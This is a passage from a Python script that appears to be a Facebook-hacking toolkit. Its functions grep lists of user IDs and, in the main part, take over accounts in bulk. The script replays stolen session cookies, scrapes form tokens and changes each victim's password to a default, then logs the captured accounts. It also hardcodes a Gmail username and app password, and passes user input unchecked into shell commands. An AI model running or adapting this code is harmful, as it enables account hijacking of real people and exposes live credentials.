			input("  [ Press Enter To Go Back ] ")
			time.sleep(1)
			self.remove_links()
		except:
			p("  [ File Not Found ]  ");sp(1);self.remove_links()


	def links_only(self):
		os.system("rm -rf .tmp.txt")
		try:
			p(" [  Example  :-  /sdcard/file.txt  ] ")
			file = input(" [•|•] Enter File Path :- ")
			line()
			p("   Example  :-  /sdcard/file1.txt  ")
			sav = input(" [✓] Enter Save Path :- ")
			line()
			p(" [•]  Example  :- 1 , 2 , 3 , 4 , 5 , 6 etc  ")
			try:
				limit = int(input(" [•|•] how many links you wants to grep :- "))
				line()
			except:
				limit = 1
			t = open(file,"r").read().splitlines()
			xx = open(".tmp.txt","a")
			for x in t:
				uid = x.split("|")[0]
				xx.write(uid+'\n')
				xx.close()
			p("	 Example  :-  100089,88,87 etc")
			for n in range(limit):
				print(open(".tmp.txt","r").read().splitlines())
				digit = int(input(" [•|•] Enter Digit %s :- "%(n+1)))
				line()
				os.system('cat .tmp.txt | grep '+str(digit)+' >>'+sav+' ')
				p(" [   Your File Saved in :- %s ]  "%(sav))
				input(" [ Press Enter To go Back ] ")
				sp(1)
				self.links_only()
		except Exception as e:
				print(" [^=^] Your File Not Found :( ")
				sp(2);self.links_only()


	def with_names(self):
		logo()
		finput = input(' [•] Put File Path :')
		sav= input(' [•] Put File Save Path : ')
		digits = input(' [•] Put Digits separated by comma : ').split(',')
		spc=[]
		try:
			file = open(finput,'r').read().splitlines()
			xx = open(sav,'a')
			for mix in file:
				uid = mix.split('|')[0]
				nm = mix.split('|')[1]
				for digit in digits:
					if digit in uid:
						if uid not in spc:
							if uid.startswith(digit):
								xx.write(uid+'|'+nm+'\n')
			p(' [•] Grepping Done!!!!!')
			p(' [•] Your File Saved in : %s '%(sav))
		except FileNotFoundError:
			print(' [•] File Not Found !!!!')
class Server:
	def report(self):
		logo()
		print(" [•] Ex Cp issues/New updates Etc ")
		print(' [•] Please Describe issues in details\n [•] It will be send to Admin ')
		line()
		issue = input(' [•] Describe your Problem : ')
		name = input(' [•] Enter Your Name :- ')
		email = input(' [•] Enter Your Email/Contact/Fb Link : ')
		print(' [•] Sending Your Appeal .....')
		form = f'	__________________\n	Full Name : {name} \n	Email  : {email} \n	Issues : {issue} '
		TEXT = form
		SUBJECT = " Dilute Codes Users Feedback"
		message = ('Subject: {}\n\n{}').format(SUBJECT, TEXT)
		se = "serverdilute@gmail.com"
		rse = "serverdilute@merry.pink"
		username = "serverdilute@gmail.com"
		password = "usqscwnpoyehoytc"
		server = smtplib.SMTP('smtp.gmail.com', 587)
		server.ehlo()
		server.starttls()
		server.login(username, password)
		server.sendmail(se, rse, message)
		print(" [•] Your Appleal Has been Submitted ")
		print(form)
		exit()

		
class automation:
	def __init__(self):
		self.url = "https://free.facebook.com"
	def menu(self):
		logo()
		
		p(" [1] Facebook Password Change Menu ")
		p(' [2] Cut Used File lines ')
		am = input(" [•] Select an option : ")
		if am == "1":self.iAmPasswordManager()
		elif am == "2":self.used_cutter()
		else:
			p(" [•] wrong select!! ");sp(2);self.menu()
	def used_cutter(self):
		clear()
		logo()
		lines=[]
		p(" [•] Ex : /sdcard/file.txt")
		try:
			file = input(" [•] Put File Path : ")
		except Exception as e:
			print(" [•] File Path Incorrect!! ");sp(2);self.used_cutter()
		digit= int(input(" [•] Put Line Num :"))
		with open(file,"r") as r:
			lines = r.readlines()
		with open(file,"w") as w:
			for num,line in enumerate(lines):
				if num >= digit:
					w.write(line)
		p(" [•] File Splitted Complete")
	def iAmPasswordManager(self):
		logo()
		p(" [•] Password Changer By : CyberDemon ")
		line()
		p(" [1] Change Passwords (Bulk) \n [2] Change Single Account Password \n [3] Change Default Password \n [B] Press B To Back ")
		line()
		iamoption = input(' [•] Choose : ')
		if iamoption == '1':
			self.bulk_password()
		elif iamoption =='2':
			self.single_password()
		elif iamoption =='3':
			self.change_default()
		elif iamoption =='B':
			iAmApprovelSystem()
		else:
			p(" [•] Wrong Select ! ")
			sp(2);self.iAmPasswordManager()
	
	def bulk_password(self):
		sav = "/sdcard/demon_passwords.txt"
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "demon1234"
		logo()
		p(" [•] Password Changer By : Cyber Demon ")
		line()
		print(" [•] Default Password : %s "%(iamdefaultpassword))
		line()
		np = iamdefaultpassword
		try:
			file = input(" [•] Put File Path : ")
			id = open(file,"r").read().splitlines()
		except FileNotFoundError:
			print(" [•] File Not Found ! ")
			sp(2)
			self.bulk_password()
		logo()
		print(" [•] Password Changing Procces is started ! ")
		line()
		p(" [•] Total File Accounts : %s "%(len(id)))
		line()
		p(" [•] Please Be Patience Use Fast Internet ")
		line()
		for x in id:
			uid = x.split("|")[0]
			pw = x.split('|')[1]
			cok = x.split('|')[2]
			cookies = {"cookie":cok}
			try:
				r= requests.get("https://mbasic.facebook.com/settings/security/password/?", headers=cookies).text
				r= r.replace("amp;","")
			except CE:
				print(" [•] Check Your Internet Unexpected Stopped ! ")
				exit()
			
			next = re.findall('action\="(.*?)"',r)[1]
			data = {
		"fb_dtsg":re.findall('name="fb_dtsg" value="(.*?)"',r),
		"jazoest":re.findall('name="jazoest" value="(.*?)"',r),
		"password_change_session_identifier":re.findall('name="password_change_session_identifier" value="(.*?)"',r),
	"password_old":pw,
	"password_new":np,
	"password_confirm":np,
	"save": "Save changes"
	}
			po = requests.post("https://mbasic.facebook.com"+str(next),headers=cookies,data=data).text
			po = po.replace("amp;","")
			if 'Password changed' in po:
				p(" [•]  \033[1;92m✓ Password Changed Succesfully : \033[1;97m%s "%(uid))
				open(sav,"a").write(uid+'|'+np+'\n')
			else:
				p(" [•]\033[1;91m Failed To Changed Password : \033[1;97m%s "%(uid))
		line()
		print(" [•] Proccess Has Been Completed ! ")
		print(" [•] Your File Saved in %s "%(sav))
		line()
		input(" [•] Press Enter To Go Back to Password Menu ! ")
		sp(1)
		self.iAmPasswordManager()
		
		
	def single_password(self):
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "demon1234"
		logo()
		p(" [•] Password Changer By : CyberDemon ")
		line()
		print(" [•] Default Password : %s "%(iamdefaultpassword))
		line()
		np = iamdefaultpassword
		pw = input(" [•] Put Old Pass : ")
		cok = input(" [•] Paste Cookies : ")
		cookies = {'cookie':cok}
		r= requests.get("https://mbasic.facebook.com/settings/security/password/?",headers=cookies).text
		r= r.replace("amp;","")
		next = re.findall('action\="(.*?)"',r)[1]
		data = {
	"fb_dtsg":re.findall('name="fb_dtsg" value="(.*?)"',r),
	"jazoest":re.findall('name="jazoest" value="(.*?)"',r),
	"password_change_session_identifier":re.findall('name="password_change_session_identifier" value="(.*?)"',r),
	"password_old":pw,
	"password_new":np,
	"password_confirm":np,
	"save": "Save changes"
	}
		po = requests.post("https://mbasic.facebook.com"+str(next),headers=cookies,data=data).text
		print(po)
		po = po.replace("amp;","")
		if 'Password changed' in po:
			p(" [•]  ✓ Password Changed Succesfully ")
			
			sp(2)
			input(" [•] Press Enter To Go Backk")
			self.iAmPasswordManager()
		else:
			p(" [•] Failed To Changed Password ")
	def iAmFreeMode(self,cookies,r):
		for x in re.findall('action\=\"(.*?)"',r):
			if "/zero/optin/write/?" in x:
				next = x
		data ={}
		fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"',r).group(1)
		jazoest = re.search('name="jazoest" value="(.*?)"',r).group(1)
		data.update(
		{
		'fb_dtsg':fb_dtsg,
		'jazoest':jazoest,
		'submit':'Continue'
		}
		)
		po = requests.post('https://free.facebook.com'+str(x),cookies=cookies,data=data,allow_redirects=False)
	
	def change_default(self):
		logo()
		
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "demon1234"
		p(" [•] Default Password : %s"%(iamdefaultpassword))
		line()
		os.system("rm -rf .default_password.txt ")
		change_pw = input(" [•] Put New Default Password : ")
		if len(change_pw) < 6:
			print(" [•] Password Should be More than Six Characters .")
			sp(2)
			self.change_default()
		
		t = open(".default_password.txt","w").write(change_pw)
		print(" [•] Default Password is Changed ! ")
		p(" [•] Your New Password : %s "%(change_pw))
		line()
		input("[•] Press Enter to go back ")

		self.iAmPasswordManager()







if __name__=="__main__":
	DEMON().DEMON()
	###iAmApprovelSystem()
